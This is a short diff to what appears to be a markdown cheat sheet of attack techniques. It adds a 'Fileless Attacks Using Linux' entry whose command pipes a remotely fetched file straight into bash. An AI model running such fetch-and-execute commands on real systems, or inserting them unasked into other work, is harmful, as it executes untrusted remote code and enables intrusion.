@@ -38,4 +38,7 @@ curl -o <WHERE TO SAVE FILE> <LINK TO FILE>
 
 ## Fileless Attacks Using Linux
 
-
+#### Executing a File without Downloading
+```bash
+curl <LINK TO FILE> | bash
+```
